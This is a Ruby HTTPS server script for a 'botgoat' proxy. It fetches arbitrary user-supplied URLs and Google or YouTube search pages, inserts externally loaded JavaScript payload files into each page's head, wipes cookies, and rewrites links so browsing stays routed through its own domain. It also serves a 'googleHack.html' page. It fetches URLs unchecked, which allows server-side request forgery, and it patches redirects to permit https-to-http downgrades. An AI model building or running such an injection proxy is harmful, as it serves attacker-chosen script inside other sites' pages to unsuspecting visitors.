#!/usr/bin/env ruby

require 'rubygems'
require "webrick"
require 'open-uri'
require 'net/http'
require 'webrick/https' 
require 'openssl'
require 'json'
require_relative("parser") 

ArgPar = Parser.new

host, port, _cert_, _key_ = '46.121.206.221', 443, ArgPar.par()[2], ArgPar.par()[3]
$payload = ArgPar.par()[4]
$payload2 = File.read '/home/rt/botgoat/ruby/bups/payload2.js'
$host = host 
$port = port
$resDef = 
     '<html>
      <head>
      <title>oops</title>
      <script>
      function redirect(){
               var location="https://botgoat.com"; 
               window.location = location;
      }
      </script>
      </head>
      <body>
     <head>
    <style type="text/css">
     container
      {
      position:absolute;
      left:585px;
      top:400px;
      color:black;
     }
     body{
	background-image: url("http://spectrum.mcckc.edu/images/examples/404-02-l.jpg");	
	}
  </style>
   <head>
    <container>
    <p>404 not found</P> 
    <input type="button" onclick="redirect()" value="click to go back to the main site">
   </container>
   <body>
  </html>'

module OpenURI
  class << self
    def redirectable?(uri1, uri2)
      a, b = uri1.scheme.downcase, uri2.scheme.downcase
      a == b || (a == 'http' && b == 'https')
      a == b || (a == 'https' && b == 'http')
    end
  end
end

class Dogma < WEBrick::HTTPServlet::AbstractServlet
    
    def buildline(newc, sub)
     renderedContent = ""
     for ind in 0 ... newc.size
       unless ( ind == 0 )
         if ( ind < newc.size )
            renderedContent += newc[ind]
         else
            renderedContent += newc[ind] + "\n"
         end
       else
           renderedContent += newc[ind] + sub
       end
     end
     return renderedContent
    end 

    def inject(content)
      ed = content.split("<head>")[1].split("</head>")[0].split("\n")
      edit = []
      ed.each do | inspect |
         if ( inspect.include? 'google-analytics' )
           puts inspect
	 else
           edit.push(inspect)
	 end
      end
      edit = content.split("<head>")[1].split("</head>")[0].split("\n")
      second = edit.unshift($payload)
      sec = second.unshift('<script src="https://code.jquery.com/jquery-1.10.2.js"></script>')
      sec.push('<script>for (var it in $.cookie()) $.removeCookie(it);</script>')
      res = ""
      first = content.split("<head>")[0]
      third = content.split("<head>")[1].split("</head>")[1]
      renderedContent = ""
      res += first
      second.each do |referrer|
	res += referrer + "\n"
      end
      res += third
      return res
      end

    def do_GET (request, response)
        if request.query["url"]
         begin 
          url = request.query["url"]
          response.status = 200
          if (not ((url.split(":")[0] == "http") or (url.split(":")[0] == "https")))
            response.status = 200
            response.content_type = "html"
            response.body = $resDef
            return
          end
          begin
            res  = open(url) {|f| f.read }.to_str.encode(Encoding::UTF_8)
          rescue
            res  = open(url) {|f| f.read }.to_str
          end          
          response.content_type = "html"
          if !url.include? "https"
            if !res 
              url = url.gsub! 'http', 'https'
              res  = open(url) {|f| f.read }
            end
          end
          resp = self.inject(res)
          response.body = resp
         rescue
          response.status = 200
          response.content_type = "html"
          response.body = $resDef
         end
       else
         #TODO: another method ...
       end
    end
end

class Anja < WEBrick::HTTPServlet::AbstractServlet
    
    def buildLine(newc, sub)
     renderedContent = ""
     for ind in 0 ... newc.size
       unless ( ind == 0 )
         if ( ind < newc.size )
            renderedContent += newc[ind]
         else
            renderedContent += newc[ind] + "\n"
         end
       else
           renderedContent += newc[ind] + sub
       end
     end
     return renderedContent
    end 

    def modify(content, url)
      edit = content.split("\n")
      renderedContent = ""
      edit.each do |referrer|
        if (referrer.include? 'url')
          newc = referrer.split('url')
          sub = url
          refferrer = self.buildLine(newc, sub)
        end
        if (referrer.include? ' href="http' or referrer.include? ' href="https')
          newc = referrer.split("//")
          if !(referrer.include? 'href="https')
            sub = "s//botgoat.com/anja/get?url=http://"
            renderedContent += self.buildLine(newc, sub)
          else
            sub = "//botgoat.com/anja/get?url=https://"
            renderedContent += self.buildLine(newc, sub)
          end
        elsif (
               referrer.include? ' src="/' or
               referrer.include? ' content="/' or
               referrer.include? 'href="/' or
               referrer.include? 'srcset="/' or
               referrer.include? " src='/"
              )
          unless (referrer.include? " src='/")
            newc = referrer.split('="/')
            sub = '="' + url + '/'
            renderedContent += self.buildLine(newc, sub)
          else
            newc = referrer.split('="/')
            sub = "='" + url + '/'
            renderedContent += self.buildLine(newc, sub)
          end
        else
          renderedContent += referrer + "\n"
        end 
       end
       return renderedContent
      end
    
    def inject(content, url)
        edit = content.split("<head>")[1].split("</head>")[0].split("\n")
        if (url.include? 'youtube' )
          second = edit.unshift(File.read '/home/rt/botgoat/ruby/bups/pl.js')
          if (url.include? 'watch')
            secon = second.unshift(File.read '/home/rt/botgoat/ruby/bups/yt.js')
            sec = secon.unshift('<script src="https://code.jquery.com/jquery-1.10.2.js"></script>')
          end
	elsif (url.include? 'youtube' and url.include? '&sa')
	  second = edit.unshift(File.read '/home/rt/botgoat/ruby/bups/ytRe.js')
          sec = second.unshift('<script src="https://code.jquery.com/jquery-1.10.2.js"></script>')
          sec.push('<script>for (var it in $.cookie()) $.removeCookie(it);</script>')
        else
          second = edit.unshift($payload)
          sec = second.unshift('<script src="https://code.jquery.com/jquery-1.10.2.js"></script>')
          sec.push('<script>for (var it in $.cookie()) $.removeCookie(it);</script>')
        end
        res = ""
        first = content.split("<head>")[0]
        third = content.split("<head>")[1].split("</head>")[1]
        renderedContent = ""
        res += first
        sec.each do |referrer|
	  res += referrer + "\n"
        end
        res += third
        return res
      end

    def do_GET (request, response)
        if request.query["url"]
         begin 
          url = request.query["url"]
          if (not ((url.split(":")[0] == "http") or (url.split(":")[0] == "https")))
            response.status = 200
            response.content_type = "html"
            response.body = $resDef
            return
          end
          response.status = 200
          begin
            res  = open(url) {|f| f.read }.to_str.encode(Encoding::UTF_8)
          rescue
            res  = open(url) {|f| f.read }
          end          
          response.content_type = "html"
	  begin
            if !url.include? "https"
              if !res 
                url = url.gsub! 'http', 'https'
                res  = open(url) {|f| f.read }
              end
            end
	  rescue
            url = url.gsub! 'https', 'http'
	    res  = open(url) {|f| f.read }
	  end
          result = self.inject(res, url)
          response.body = result
         rescue
          response.status = 200
          response.content_type = "html"
          response.body = $resDef
      end
       else
         #TODO: another method ...
       end
    end
end

class Moon < WEBrick::HTTPServlet::AbstractServlet

    def inject(content, queryStr) 
	if (queryStr.include? 'youtube')
          edit = content.split("<head>")[1].split("</head>")[0].split("\n")
          second = edit.unshift(File.read '/home/rt/botgoat/ruby/bups/pl.js')
        else
          edit = content.split("<head>")[1].split("</head>")[0].split("\n")
	  second = edit.unshift($payload2)
	end
        sec = second.unshift('<script src="https://code.jquery.com/jquery-1.10.2.js"></script>')
        res = ""
        first = content.split("<head>")[0]
        third = content.split("<head>")[1].split("</head>")[1]
        renderedContent = ""
        res += first
        second.each do |referrer|
	  res += referrer + "\n"
        end
        res += third
        return res
      end

    def do_GET (request, response)
        if request.query["query"]
         begin
          queryStr = request.query["query"]
	  if ( queryStr.include? 'youtube' )
	    url = 'https://www.youtube.com/results?search_query=' + queryStr
	  else
	    url = "https://www.google.com/search?num=100&q="+queryStr+"&webhp?hl=en&ned=us&tab=nw&gws_rd=ssl,cr"
          end
          begin
            res  = open(url) {|f| f.read }.to_str.encode(Encoding::UTF_8)
            #res = open() # Nokogiri::HTML(
          rescue
            res  = open(url) {|f| f.read }.to_str
            #res = Nokogiri::HTML(open("https://www.google.com/search?num=10&q="+queryStr))
          end
          #puts res
          response.content_type = "html" 
          response.body = self.inject(res, queryStr)
        rescue
          response.status = 200
          response.content_type = "html"
          response.body = $resDef
        end
       end
    end
end

class Sonia < WEBrick::HTTPServlet::AbstractServlet
    
    def buildLine(newc, sub)
     renderedContent = ""
     for ind in 0 ... newc.size
       unless ( ind == 0 )
         if ( ind < newc.size )
            renderedContent += newc[ind]
         else
            renderedContent += newc[ind] + "\n"
         end
       else
           renderedContent += newc[ind] + sub
       end
     end
     return renderedContent
    end 

    def modify(content, url)
      edit = content.split("\n")
      renderedContent = ""
      edit.each do |referrer|
        if (referrer.include? 'url')
          newc = referrer.split('url')
          sub = url
          referrer = self.buildLine(newc, sub)
        end
        if (referrer.include? 'href="http' or referrer.include? 'href="https')
          newc = referrer.split("://")
          if !(referrer.include? 'href="https')
            sub = "s://"+"botgoat.com/sonia/"+"get?url=http://"
            renderedContent += self.buildLine(newc, sub)
          else
            sub = "://"+"botgoat.com/sonia/"+"get?url=https://"
            renderedContent += self.buildLine(newc, sub)
          end
        elsif    (
               referrer.include? ' src="/' or
               referrer.include? ' content="/' or
               referrer.include? 'href="/' or
               referrer.include? 'srcset="/' or
               referrer.include? " src='/"
              )
          unless (referrer.include? " src='/")
            newc = referrer.split('="/')
            sub = '="' + url + '/'
            renderedContent += self.buildLine(newc, sub)
          else
            newc = referrer.split('="/')
            sub = "='" + url + '/'
            renderedContent += self.buildLine(newc, sub)
          end
        else
          renderedContent += referrer + "\n"
        end 
       end
       return renderedContent
      end

    def do_GET (request, response)
        if request.query["url"] 
         begin
          url = request.query["url"]
          if (not ((url.split(":")[0] == "http") or (url.split(":")[0] == "https")))
            response.status = 200
            response.content_type = "html"
            response.body = $resDef
            return 
          end
          response.status = 200
          begin
            res  = open(url) {|f| f.read }.to_str.encode(Encoding::UTF_8)
          rescue
            res  = open(url) {|f| f.read }.to_str
          end          
          response.content_type = "html"
          if !url.include? "https"
            if !res 
              url = url.gsub! 'http', 'https'
              res  = open(url) {|f| f.read }
            end
          end
          result = self.modify(res, url)
          response.body = result
        rescue
          response.status = 200
          response.content_type = "html"
          response.body = $resDef
      end
       else
         #TODO: another method ...
       end
    end
end

class Juls < WEBrick::HTTPServlet::AbstractServlet

    def do_GET (request, response)
        response.status = 200
        response.content_type = "html"
        response.body = File.read "/home/rt/botgoat/ruby/bups/googleHack.html"
    end
end

cert = OpenSSL::X509::Certificate.new File.read '/home/rt/cert/cert/botgoat_com.crt'
pkey = OpenSSL::PKey::RSA.new File.read '/home/rt/cert/cert/server.key'

server = WEBrick::HTTPServer.new(
	:host => $host,
	:Port => $port,:SSLEnable => true,
	:SSLCertificate => cert,
	:SSLPrivateKey => pkey,
        :DocumentRoot => '/home/rt/botgoat/ruby/bups/main.html'
	)

server.mount "/dogma/", Dogma
server.mount "/moon/", Moon
server.mount "/anja/", Anja
server.mount "/sonia/", Sonia
server.mount "/juls/", Juls

trap("INT") {
    server.shutdown
}

server.start
